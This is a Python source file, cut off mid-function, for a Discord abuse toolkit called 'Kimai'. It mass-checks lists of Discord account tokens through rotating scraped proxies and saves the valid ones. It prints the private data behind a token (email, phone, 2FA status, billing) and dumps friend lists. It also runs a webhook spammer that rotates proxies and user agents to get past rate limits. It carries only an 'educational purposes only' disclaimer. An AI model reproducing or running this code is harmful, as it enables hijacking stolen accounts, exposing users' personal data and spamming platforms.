import requests
import json
import ctypes
import os
import time
import random
import zipfile
import ctypes
import easygui
import wget
import re
from pick import pick
from datetime import datetime
from colorama import Fore, init
from fake_useragent import UserAgent
from time import sleep, strftime, time, gmtime
from pystyle import Anime, Colorate, Colors, Center
from halo import Halo
from threading import Thread
import threading
ua = UserAgent()
init(autoreset=True)

__current_version__ = '1.1'

banners = [
r"""
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
""" ,
r"""
╭━┳━╭━╭━╮╮
┃┈┈┈┣▅╋▅┫┃
┃┈┃┈╰━╰━━━━━━╮
╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣
╲┃┈┈┈┈┈┈┈┈┈┈▉▉▉
╲┃┈┈┈┈┈┈┈┈┈┈◥▉◤
╲┃┈┈┈┈╭━┳━━━━╯
╲┣━━━━━━┫
""",
r"""
██╗░░██╗███████╗███╗░░██╗████████╗░█████╗░██╗
██║░░██║██╔════╝████╗░██║╚══██╔══╝██╔══██╗██║
███████║█████╗░░██╔██╗██║░░░██║░░░███████║██║
██╔══██║██╔══╝░░██║╚████║░░░██║░░░██╔══██║██║
██║░░██║███████╗██║░╚███║░░░██║░░░██║░░██║██║
╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝
I think I got the name wrong, it was Kimai :3
""",
r"""
                                                   /%#(%,                       
                       #%###%                   *#((%((#(#(                     
                     (#//* *(#                *((%## #(%/,%/                    
                     /( ((((./#.              ##(#(.##(## #(                    
                     *# ##### #(            .(##( ,(%#(%%.##                    
                      % *#(#( ##(           #(##( #(#%(#( ##                    
                      (# ####.(#(%          (((#(.,,(#,.#((                     
                      *(*# * (((/#         .######%#(%(#%#                      
                       #((((#(##(##/##(%((##(#(#((#((%(/%*                      
                        ((#(#((#(##/##/(((#((((((/##(##(##(                     
                      .#((  /#(#(  /#%(#####  ###(   ##(##(#                    
                     #((#(###    ###(%((#((((#/   *(/(#/##((/                   
                    .((/(//*/(/(#/#(/#(/#(##(#((%(#%##%%#%###.                  
                     #( # (((#((#/(#/##/#((((((/#((#  #((#/(#.                  
                     /#/((/(/(//#((#/(,,((/((((/((/#((#((#((#                   
                     *#((#(#(##(#((%((%(##(##((/((/(((#(/#(                     
                         ..#//(/(#/((/((/#((((#/#(*(#/%  

                         Kimai made by github.com/beeteo                     
                                                               
"""
]

warning_message = fr"""
 ____________________
/                    \
|                    |
|                    |
\____________________/
         !  !
         !  !
         L_ !                                            {Fore.RED}Caution{Fore.WHITE}!{Fore.RESET}
        / _)!             
       / /__L              The creator is not responsible for any misuse or damage caused by this tool.
 _____/ (____)
        (____)
 _____  (____)
      \_(____)                       {Fore.YELLOW}Remember this is for educational purposes only.{Fore.RESET}
         !  !
         !  !
         \__/
"""

default = {
    "console":{
        "foreground_color": "white",
        "back_color": "cyan",
        "warning_message_start": "true"
    },
    "script": {
        "start": "None"
    },
    "discord":{
        "richpresence": "on"
    },
    "logs": {
        "status": "off"
    }
}

def warning_message_screen():
    if os.path.exists('Settings'):
        try:
            with open('Settings/Settings.json') as f:
                data = json.load(f)
        except:
            with open('Settings/Settings.json') as f:
                json.dump(default, f, indent=4)
    else:
        os.mkdir('Settings')
        with open('Settings/Settings.json', 'w') as f:
            json.dump(default, f, indent=4)
        
        with open('Settings/Settings.json') as f:
            data = json.load(f)
    
    if data['console']['warning_message_start'] == "true":
        print(warning_message)
        print()
        print(f'{Fore.CYAN}>_{Fore.WHITE} Do you want this message to be displayed every time the program is opened?')
        warning_text = input(f'{Fore.CYAN}>_{Fore.WHITE} y/n > ')

        if warning_text == 'y':
            data['console']["warning_message_start"] = "true"
        elif warning_text == 'n':
            data['console']["warning_message_start"] = "false"
        else:
            data['console']["warning_message_start"] = "false"
        
        with open('Settings/Settings.json', 'w') as f:
            json.dump(data, f, indent=4)
    else:
        pass

warning_message_screen()

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

class GetColor:
    def __init__(self, parms:None):
        self.parms = parms
        self.colors = [
            Fore.WHITE,
            Fore.LIGHTBLUE_EX,
            Fore.LIGHTCYAN_EX,
            Fore.LIGHTYELLOW_EX,
            Fore.LIGHTRED_EX,
            Fore.LIGHTGREEN_EX,
            Fore.LIGHTBLACK_EX
        ]

    def color(self):
        if self.parms == 'white':
            return Fore.WHITE
        elif self.parms == 'blue':
            return Fore.LIGHTBLUE_EX
        elif self.parms == 'cyan':
            return Fore.LIGHTCYAN_EX
        elif self.parms == 'yellow':
            return Fore.LIGHTYELLOW_EX
        elif self.parms == 'red':
            return Fore.LIGHTRED_EX
        elif self.parms == 'green':
            return Fore.LIGHTGREEN_EX
        elif self.parms == 'black':
            return Fore.LIGHTBLACK_EX
        elif self.parms == 'random':
            return random.choice(self.colors)
        else:
            return Fore.LIGHTCYAN_EX

with open('Settings/Settings.json') as f:
    data = json.load(f)
back_color = data['console']['foreground_color']
frontcolor = data['console']['back_color']

backcolor = GetColor(parms=back_color)
front_color = GetColor(parms=frontcolor)
custom = front_color.color()
front = backcolor.color()

text = fr'''
{front}██{custom}╗{front}  ██{custom}╗{front}██{custom}╗{front}███{custom}╗   {front}███{custom}╗ {front}█████{custom}╗ {front}██{custom}╗
{front}██{custom}║{front} ██{custom}╔╝{front}██{custom}║{front}████{custom}╗ {front}████{custom}║{front}██{custom}╔══{front}██{custom}╗{front}██{custom}║
{front}█████{custom}╔╝ {front}██{custom}║{front}██{custom}╔{front}████{custom}╔{front}██{custom}║{front}███████{custom}║{front}██{custom}║
{front}██{custom}╔═{front}██{custom}╗ {front}██{custom}║{front}██{custom}║╚{front}██{custom}╔╝{front}██{custom}║{front}██{custom}╔══{front}██{custom}║{front}██{custom}║
{front}██{custom}║  {front}██{custom}╗{front}██{custom}║{front}██{custom}║ ╚═╝ {front}██{custom}║{front}██{custom}║  {front}██{custom}║{front}██{custom}║
{custom}╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝'''

class Kimai:
    def __init__(self):
        self.endpoints = [
            'https://discord.com/api/v9/users/@me/guilds',
            'https://discord.com/api/v9/users/@me/relationships',
            'https://discord.com/api/v9/users/@me/channels',
            'https://discord.com/api/v9/users/@me'
        ]
        self.proxy_api = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
        self.proxy_http_api = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
        self.proxy_socks4_api = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all'
        self.proxy_socks5_api = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
        self.logos = [
            'logo',
            'logo2',
            'logo3'
        ]
        self.update_url = 'https://raw.githubusercontent.com/lbeete/Kimai/main/version.log'
        self.dms = []
        self.dms_id = []
        self.friends_id = []
        self.month = datetime.today().month
        self.day = datetime.today().day
        self.year = datetime.today().year
        self.minute = datetime.today().minute
        self.hour = datetime.today().hour
        self.seconds = datetime.today().second
        self.pc_name = os.environ['COMPUTERNAME']
        self.start_time = 0
        self.stop = True
        self.get_update()
        self.loading()
        self.menu()
    
    def randomize(self, *, parms: None):
        return random.choice(parms)

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def set_title(self, args: str):
        return ctypes.windll.kernel32.SetConsoleTitleW(args)

    def now_time(self):
        return strftime("%H:%M:%S", gmtime(time() - self.start_time))
    
    def tokenstrip(self, token: str=None):
        if token is None:
            return 'Please enter a token'
        else:
            if '"' in token:
                new_token = token.strip('"')
            else:
                new_token = token
            return new_token

    def get_update(self):
        try:
            data = requests.get(
                url='https://raw.githubusercontent.com/lbeete/Kimai/main/version.log'
            ).text
            if 'version' in data:
                version = data.split('version =')[1].split('\n')[0].split(' ')[1]
                
                if version == __current_version__:
                    print('Kimai is updated!')
                else:
                    print('Kimai needs updating!')
                    print('Do you want to update to the latest version?')
                    choice = str(input('Yes (Y) - No (N): '))
                    
                if choice == 'y':
                    with Halo(text='Downloading - File name: Kimai v{}'.format(version), spinner='dots'):
                        wget.download(
                            url = 'https://github.com/lbeete/Kimai/archive/refs/heads/main.zip',
                            bar = None
                        )
                    with zipfile.ZipFile(file='Kanot-main.zip') as file:
                        file.extractall()
                    os.rename(src='Kanot-main', dst=f'Kimai-{version}')
                    os.remove(path='Kanot-main.zip')
                elif choice == 'Y':
                    with Halo(text='Downloading - File name: Kimai v{}'.format(version), spinner='dots'):
                        wget.download(
                            url = 'https://github.com/lbeete/Kimai/archive/refs/heads/main.zip',
                            bar = None
                        )
                    with zipfile.ZipFile(file='Kanot-main.zip') as file:
                        file.extractall()
                    os.rename(src='Kanot-main', dst=f'Kimai-{version}')
                    os.remove(path='Kanot-main.zip')
                elif choice == 'n':
                    pass
                else:
                    pass
            else:
                pass
        except:
            print("You don't have internet to check for new updates, but it doesn't matter ;)")

    def tokenchecker(self):
        proxys = []
        proxylines = 0
        valid = 0
        invalid = 0
        retries = 0
        total = 0
        # https://discord.com/api/v9/users/@me
        self.clear()
        print(text)

        text_choice = f'{Fore.WHITE}[{custom}+{Fore.WHITE}] Select your {custom}proxy {front}type\n\n{Fore.WHITE}[{custom}1{Fore.WHITE}] HTTP/S\n{Fore.WHITE}[{custom}2{Fore.WHITE}] SOCKS4\n{Fore.WHITE}[{custom}3{Fore.WHITE}] SOCKS5\n{Fore.WHITE}[{custom}4{Fore.WHITE}] from {front}API{Fore.WHITE}\n\n{front} - {custom}Proxy type: '
        print(text_choice, end='')
        choice = int(input())

        try:
            if choice == 1:
                proxytype = 'https'    
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path) 
                proxy_type = 'HTTPS'                     
            elif choice == 2:
                proxytype = 'socks4'
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path)
                proxy_type = 'SOCKS4'
            elif choice == 3:
                proxytype = 'socks5'
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path)  
                proxy_type = 'SOCKS5'
            elif choice == 4:
                proxytype = 'https'
                loader = requests.get(self.proxy_api).text.splitlines()
                for l in loader:
                    ip = l.split(":")[0]
                    port = l.split(":")[1]
                    proxys.append({'http': 'https'+'://'+ip+':'+port.rstrip("\n")})
                print(f'{Fore.MAGENTA}{len(loader)} Proxys loaded from API')
                proxylines += len(loader)
                proxy_type = 'From API'
            else:
                print(f'[{custom}!{Fore.RESET}] Please enter a valid choice such as 1, 2, 3, 4 or 5!')
                os.system('pause >nul')
                self.tokenchecker()
        except:
            self.tokenchecker()

        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select your tokens', multiple= False)
        open(path, "r", encoding="utf-8")
        self.start_time = time()
        total += int(len(path))
        self.clear()
        print(text)
        print()
        with open(path, 'r', encoding="utf-8") as f:
            for token in f:
                self.set_title(f'Kimai | Token Checker | Valid: {valid} - Invalid: {invalid} | Retries: {retries} | Proxys: {proxylines} {proxy_type} | Elapsed: {self.now_time()}')
                token_load = token.split('\n')
                data = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token_load[0]}, proxies=random.choice(proxys))
                
                self.folder = 'Results/TokenChecker'
                if not os.path.exists('results'):
                    os.mkdir('results')
                if not os.path.exists(self.folder):
                    os.mkdir(self.folder)

                if data.status_code == 200:
                    valid += 1
                    print(f'{front}[{custom}Valid token{front}]{Fore.WHITE} - {custom}{token_load[0]}')
                    open(f'Results/TokenChecker/Valid-Tokens-{self.day}-{self.month}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a', encoding="utf-8").write(f'{token_load[0]}\n')
                elif data.status_code == 401:
                    invalid += 1
                    print(f'{front}[{Fore.RED}Invalid token{front}]{Fore.WHITE} - {custom}{token_load[0]}')
                else:
                    retries += 1
        input('Done!')

    def dumpfriends(self, token):
        self.clear()
        print(text + '\n')
        friends = 0
        headers = {
            "Authorization": token
        }
        try:
            data_req = requests.get(url='https://discord.com/api/v9/users/@me/relationships', headers=headers).json()
            for friend in data_req:
                friends += 1
                self.set_title(args=f'Kimai | Dump friends | Friends dumped: {friends}')
                print(f'{Fore.WHITE}[{custom}Friend{Fore.WHITE}] ' + friend['user']['username'] + '#' + friend['user']['discriminator'])
                if os.path.exists('Data'):
                    with open('Data/FriendsDumps.txt', 'a', encoding="utf-8") as txt:
                        txt.write(friend['user']['username'] + '#' + friend['user']['discriminator'] + '\n')
                else:
                    os.mkdir('Data')
                    with open('Data/FriendsDumps.txt', 'a', encoding="utf-8") as txt:
                        txt.write(f"{friend['user']['username']}#{friend['user']['discriminator']}\n")
                    
            friends = friends
            if friends == 0:
                friends_text = f'{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Apparently this account has no friends added and could not be scraped :('
            else:
                friends_text = f'{Fore.WHITE}[{custom}+{Fore.WHITE}] {Fore.MAGENTA}Done!, {custom}{friends} friends{Fore.MAGENTA} dumped in {custom}Data/FriendsDumps.txt'
            
            print(friends_text)
            input(Fore.MAGENTA + 'press ENTER for continue!')
            self.main()
        except:
            print(f'{Fore.RED}A mysterious error has occurred, please try again later')
            input(Fore.MAGENTA + 'press ENTER for continue!')
            self.main()

    def Tokeninfo(self, token):
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            res_json = res.json()

            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json['id']
            avatar_id = res_json['avatar']
            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
            phone_number = res_json['phone']
            if phone_number == '':
                phone_number = 'None'
            email = res_json['email']
            mfa_enabled = res_json['mfa_enabled']
            flags = res_json['flags']
            locale = res_json['locale']
            verified = res_json['verified']
                
            language = languages.get(locale)

            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

            has_nitro = False
            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)
            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)

            print(text)

            print(f'{Fore.WHITE}| {custom}Username: {Fore.WHITE}{user_name} {Fore.WHITE}| {custom}ID: {Fore.WHITE}{user_id} {Fore.WHITE}| {custom}Creation date: {Fore.WHITE}{creation_date}')
            print(f'{Fore.WHITE}| {custom}Avatar URL: {Fore.WHITE}{avatar_url if avatar_id else "None"}')
            print(f'{Fore.WHITE}| {custom}Token Account: {Fore.WHITE}{token}')
            print(f'{Fore.RESET}')
            print(f'{Fore.WHITE}| {custom}Nitro:{Fore.WHITE} {has_nitro}')
            if has_nitro:
                print(f'{Fore.WHITE}| {custom}Expires in:{Fore.WHITE} {days_left} {custom}day(s){Fore.WHITE}')
            print(f'{Fore.RESET}')
            print(f'{Fore.WHITE}| {custom}Phone Number: {Fore.WHITE}{phone_number if phone_number else ""}')
            print(f'{Fore.WHITE}| {custom}Email: {Fore.WHITE}{email if email else "None"}')
            print(f'{Fore.RESET}')
            print(f'{Fore.WHITE}| {custom}2FA/MFA Enabled: {Fore.WHITE}{mfa_enabled}')
            print(f'{Fore.WHITE}| {custom}Flags: {Fore.WHITE}{flags}')
            print(f'{Fore.RESET}')
            print(f'{Fore.WHITE}| {custom}Locale: {Fore.WHITE}{locale} ({language})')
            print(f'{Fore.WHITE}| {custom}Email Verified: {Fore.WHITE}{verified}')
            print(f'\n[{custom}x{Fore.WHITE}] Press ENTER to return menu')
            os.system('pause>nul')
            self.main()

            if res.status_code == 401:
                print(text)
                print()
                print(f'{Fore.WHITE}[{Fore.RED}x{Fore.WHITE}] {Fore.RESET}Invalid token')
                print(f'\n[{custom}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                self.main()
            else:
                print(text)
                print()
                print(f'{Fore.WHITE}[{Fore.RED}x{Fore.WHITE}] {Fore.LIGHTYELLOW_EX}Token Locked!')
                print(f'\n[{custom}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                self.main()     
        except:
            pass
    
    def easyrpc(self):
        self.clear()
        print(text)
        dev_id = input('ID: ')
        if len(dev_id) > 19:
            print('Are you sure the id is correct? [y/n]: ', end='')
            confirm = input()
            
            if confirm == 'y':
                pass
            else:
                self.easyrpc()
        dev_id = int(dev_id)
        timer = input('Start time [y/n]: ')
        if timer == 'y':
            timer = "true"
        else:
            timer = "false"
        
        data_json = {
            "text_settings": {
                "state": "I am testing easyRPC",
                "details": "Hello I am using Kimai",
                "large_text": "",
                "small_text": ""
            },
            "images": {
                "large_image": "",
                "small_image": ""
            },
            "timer": f"{timer}"
        }

        writter = f"""import time
import os
import json
from pypresence import Presence

data = {data_json}

if os.path.exists('RichPresenceSettings'):
    with open('RichPresenceSettings/Settings.json') as f:
        config = json.load(f)
else:
    os.mkdir('RichPresenceSettings')
    with open('RichPresenceSettings/Settings.json', 'w') as f:
        json.dump(data, f, indent=4)
    with open('RichPresenceSettings/Settings.json') as f:
        config = json.load(f)

if os.path.exists('RichPresenceSettings'):
    with open('RichPresenceSettings/Settings.json') as f:
        config = json.load(f)
else:
    os.mkdir('RichPresenceSettings')
    with open('RichPresenceSettings/Settings.json', 'w') as f:
        json.dump(data, f, indent=4)
    with open('RichPresenceSettings/Settings.json') as f:
        config = json.load(f)

id = {dev_id}
RPC = Presence({dev_id})
RPC.connect()
print(f"Welcome to easy-RPC generated by Kimai")
print(f"If you want to make changes you can go to the settings inside the folder called *RichPresenceSettings*")
print(f"when making any changes you need to restart this program for the changes to be applied")
print()
print("Dont close this window")
print("If you close this window the RichPresence will not work")

try:
    if config['timer'] == 'true':
        timer = time.time()
    else:
        timer = None
    
    if config['text_settings']['state'] == "":
        state = None
    else:
        state = config['text_settings']['state']
    if config['text_settings']['details'] == "":
        details = None
    else:
        details = config['text_settings']['details']
    if config['text_settings']['large_text'] == "":
        large_text = None
    else:
        large_text = config['text_settings']['large_text']
    if config['text_settings']['small_text'] == "":
        small_text = None
    else:
        small_text = config['text_settings']['small_text']
    if config['images']['large_image'] == "":
        large_image = None
    else:
        large_image = config['images']['large_image']
    if config['images']['small_image'] == "":
        small_image = None
    else:
        small_image = config['images']['small_image']

    RPC.update(
        state=state,
        details=details,
        large_text=large_text,
        small_text=small_text,
        large_image=large_image,
        small_image=small_image,
        start=timer
    )
    
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    RPC.close()
    print('Session Closed!')
        """
        try:
            if os.path.exists('EasyRPC'):
                open('EasyRPC/EasyRPC.py', "w").write(writter)
            else:
                os.mkdir('EasyRPC')
                open('EasyRPC/EasyRPC.py', "w").write(writter)
        except ValueError:
            pass
        
        self.clear()
        print(text)
        print('Done, EasyRPC created!')
        input()
        self.main()

    def webhookspam(self):
        proxys = []
        send_amount = 0
        failed = 0
        retries = 0
        total = 0
        proxylines = 0

        text_choice = f'{Fore.WHITE}[{custom}+{Fore.WHITE}] Select your {custom}proxy {front}type\n\n{Fore.WHITE}[{custom}1{Fore.WHITE}] HTTP/S\n{Fore.WHITE}[{custom}2{Fore.WHITE}] SOCKS4\n{Fore.WHITE}[{custom}3{Fore.WHITE}] SOCKS5\n{Fore.WHITE}[{custom}4{Fore.WHITE}] from {front}API{Fore.WHITE}\n\n{front} - {custom}Proxy type: '
        print(text_choice, end='')
        choice = int(input())

        try:
            if choice == 1:
                proxytype = 'https'    
                proxylines += len(path)                      
            elif choice == 2:
                proxytype = 'socks4'
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path)
            elif choice == 3:
                proxytype = 'socks5'
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path)  
            elif choice == 4:
                proxytype = 'https'
                loader = requests.get(self.proxy_api).text.splitlines()
                for l in loader:
                    ip = l.split(":")[0]
                    port = l.split(":")[1]
                    proxys.append({'http': 'https'+'://'+ip+':'+port.rstrip("\n")})
                print(f'{Fore.MAGENTA}{len(loader)} Proxys loaded from API')
                proxylines += len(loader)
            else:
                print(f'[{custom}!{Fore.RESET}] Please enter a valid choice such as 1, 2, 3, 4 or 5!')
                os.system('pause >nul')
                self.webhookspam()

        except ValueError:
            print(f'[{custom}!{Fore.RESET}] Value must be an integer')
            os.system('pause >nul')
            self.main()
        webhook = input('Enter the webhook url: ')
        messages = input('Enter the message you want to spam: ')
        amount = input('Enter your amount for send: ')
        amount = int(amount)
        self.clear()
        print(text)
        print('\n')

        data = {
            'content': str(messages)
        }
        self.start_time = time()

        for i in range(0, amount):
            headers = {
                "User-Agent": ua.random
            }
            self.set_title(f'Kimai | Webhook Spammer | Send: {send_amount} - Rate Limited: {failed} | Retries: {retries} | Remaining: {amount - i} | Proxy lines: {proxylines} | Elapsed: {self.now_time()}')
            send_requests = requests.post(url=str(webhook), data=data, proxies=random.choice(proxys), headers=headers)
            total += 1
            
            if send_requests.status_code == 204:
                send_amount += 1
                print(f'{Fore.WHITE}[{custom}Send{Fore.WHITE}] - {messages} | Remaining: {amount - i}')
            elif send_requests.status_code == 429:
                failed += 1
                print(f'{Fore.WHITE}[{Fore.RED}Failed{Fore.WHITE}] - {messages} | Remaining: {amount - i}')
            else:
                retries += 1
                print(f'{Fore.WHITE}[{Fore.RED}Failed{Fore.WHITE}] - {messages} | Remaining: {amount - i}')
        input()

    def remove_duplicates(self):
        lines_seen = set()

        if os.path.exists('Results'):
            open(f'Results/DuplicateRemove-{self.day}-{self.month}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a').write(f'')
        else:
            os.mkdir('Results')

        path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select your txt file', multiple= False)
        a = open(path, "r", encoding="utf-8")
        with open(f"Results/DuplicateRemove-{self.day}-{self.month}-{self.hour}-{self.minute}-{self.seconds}.txt", "a") as output_file:
            for each_line in open(path, "r"):
                if each_line not in lines_seen:
                    output_file.write(each_line)
                    lines_seen.add(each_line)
        print(f'{Fore.WHITE}[{custom}Console{Fore.WHITE}] All duplicate lines were removed!')
        input('Press ENTER to continue')
        self.main()

    def proxyscraper(self):
        if not os.path.exists('results'):
            os.mkdir('results')

        self.clear()
        print(text)
        print()
        print(f'{custom}> {front}Select what type of proxy you want to scrape :)')
        print(f'\n{Fore.WHITE}[{custom}1{Fore.WHITE}] HTTPS\n{Fore.WHITE}[{custom}2{Fore.WHITE}] Socks4\n{Fore.WHITE}[{custom}3{Fore.WHITE}] Socks5\n\n{custom}>_{Fore.WHITE} Your choice > ', end='')
        choice = input()

        if choice == '1':
            api_choice = self.proxy_http_api
            api_type = 'HTTPS'
        elif choice == '2':
            api_choice = self.proxy_socks4_api
            api_type = 'SOCKS4'
        elif choice == '3':
            api_choice = self.proxy_socks5_api
            api_type = 'SOCKS5'
        else:
            api_choice = self.proxy_http_api
            api_type = 'HTTPS'

        loader = requests.get(api_choice).text.splitlines()
        for l in loader:
            ip = l.split(":")[0]
            port = l.split(":")[1]
            
            with open(f'Results/{api_type}-{self.day}-{self.month}-{self.hour}-{self.minute}-{self.seconds}.txt', 'a') as file:
                file.write(f'{ip}:{port}\n')

        print(f'{custom}> {Fore.WHITE}Done, {custom}{len(loader)} {front}{api_type} Proxy {Fore.WHITE}scraped!\n\nPress ENTER to continue')
        input()
        self.main()

    def tokenchecker_capture(self):
        proxys = []
        proxylines = 0
        valid = 0
        invalid = 0
        retries = 0
        total = 0
        # https://discord.com/api/v9/users/@me
        self.clear()
        print(text)

        text_choice = f'{Fore.WHITE}[{custom}+{Fore.WHITE}] Select your {custom}proxy {front}type\n\n{Fore.WHITE}[{custom}1{Fore.WHITE}] HTTP/S\n{Fore.WHITE}[{custom}2{Fore.WHITE}] SOCKS4\n{Fore.WHITE}[{custom}3{Fore.WHITE}] SOCKS5\n{Fore.WHITE}[{custom}4{Fore.WHITE}] from {front}API{Fore.WHITE}\n\n{front} - {custom}Proxy type: '
        print(text_choice, end='')
        choice = int(input())

        try:
            if choice == 1:
                proxytype = 'https'    
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path) 
                proxy_type = 'HTTPS'                     
            elif choice == 2:
                proxytype = 'socks4'
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path)
                proxy_type = 'SOCKS4'
            elif choice == 3:
                proxytype = 'socks5'
                path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Kimai - Select proxy', multiple= False)
                open(path, "r", encoding="utf-8")
                with open(path, 'r', encoding="utf-8") as f:
                    for l in f:
                        ip = l.split(":")[0]
                        port = l.split(":")[1]
                        proxys.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
                proxylines += len(path)  
                proxy_type = 'SOCKS5'
            elif choice == 4:
                proxytype = 'https'
                loader = requests.get(self.proxy_api).text.splitlines()
                for l in loader:
                    ip = l.split(":")[0]
                    port = l.split(":")[1]
                    proxys.append({'http': 'https'+'://'+ip+':'+port.rstrip("\n")})
                print(f'{Fore.MAGENTA}{len(loader)} Proxys loaded from API')
                proxylines += len(loader)
                proxy_type = 'From API'
            else:
